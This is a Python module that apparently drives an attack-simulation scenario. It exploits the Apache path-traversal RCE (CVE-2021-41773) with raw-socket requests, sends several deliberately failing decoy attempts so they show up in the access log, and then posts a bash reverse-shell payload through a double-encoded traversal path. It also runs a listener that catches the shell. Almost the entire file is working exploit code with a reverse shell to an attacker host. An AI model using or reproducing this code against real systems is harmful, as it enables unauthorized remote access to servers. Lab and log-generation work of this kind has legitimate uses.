import socket
import threading
import time
from urllib.parse import urlparse

from chainlog import log


def _build_request(method, host, path, body=""):
    """Assemble a raw HTTP/1.1 request string."""
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body.encode())}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )


def _send_request(host, port, request):
    """Send one raw request over a fresh TCP socket and discard the response.

    A short timeout is enough: the working exploit hijacks the connection with
    the reverse shell, and the decoy attempts only need to reach the server so
    they land in the Apache access log.
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.sendall(request.encode())
    except (socket.timeout, ConnectionResetError):
        pass  # expected once the reverse shell takes over the connection
    except Exception as e:
        log(f"[-] Error sending request: {e}")
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def fire_exploit(target_url, lhost, lport, attempt_delay=0):
    """Probe the Apache RCE (CVE-2021-41773) via raw TCP sockets.

    Before the working request, a handful of plausible-but-failing variants are
    sent to mimic an attacker fine-tuning the exploit. Each one reaches the
    server and shows up in the Apache access log, but none yields a shell:
      1. un-encoded `../` traversal — Apache normalises and blocks it (the naive
         first guess).
      2. too few traversal segments — never escapes far enough to reach a binary.
      3. correct traversal but a GET — no request body means no stdin, so the
         CGI shell receives no command.
    The final POST is the real exploit: the working double-encoded traversal
    reaches `/bin/sh` and the body is piped to it as stdin.

    Requests are built by hand because both `requests` and `urllib3` re-encode
    the `%` characters in the path (`%32%65` → `%2532%2565`), which destroys the
    path-traversal. Raw socket = no normalisation.

    `attempt_delay` is the pause (seconds) inserted between attempts. It is kept
    at 0 for now but wired through so a scenario operator can later pace the
    attacker (e.g. a from–to range applied across the whole run).
    """
    time.sleep(1)  # give the listener a moment to come up

    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    payload = (
        f"echo Content-Type: text/plain; echo; "
        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    )
    working_path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

    # (method, path, body, why-it-fails). The working exploit is last.
    attempts = [
        ("POST", "/cgi-bin/../../../../bin/sh", payload, "un-encoded traversal, normalised away"),
        ("POST", "/cgi-bin/.%%32%65/bin/sh", payload, "traversal too shallow"),
        ("GET", working_path, "", "GET has no body, so no stdin for the shell"),
        ("POST", working_path, payload, "working double-encoded traversal"),
    ]

    last = len(attempts) - 1
    for i, (method, path, body, note) in enumerate(attempts):
        if i == last:
            log(f"[*] Sending exploit to {host}:{port}{path}")
        else:
            log(f"[*] Trying {method} {path} ({note})")
        _send_request(host, port, _build_request(method, host, path, body))
        if attempt_delay and i != last:
            time.sleep(attempt_delay)


def get_www_shell(target_ip, kali_ip, kali_port=4444, attempt_delay=0):
    """
    Start the listener, send the exploit, and catch the shell.
    Returns the socket object (the reverse shell).
    """
    target_url = f"http://{target_ip}"

    # 1. Prepare the socket listener
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", kali_port))
    server.listen(1)
    log(f"[*] Initial-access listener started on port {kali_port}...")

    # 2. Fire the exploit in the background
    threading.Thread(
        target=fire_exploit, args=(target_url, kali_ip, kali_port), kwargs={"attempt_delay": attempt_delay}
    ).start()

    # 3. Block until Apache calls back
    server.settimeout(15)  # wait up to 15 seconds for success
    try:
        www_shell, addr = server.accept()
        log(f"[+] Initial access successful. Shell received from {addr[0]}")
        return www_shell
    except socket.timeout:
        log("[-] Timeout — no shell received from Apache.")
        return None
    finally:
        server.close()  # release the listener port
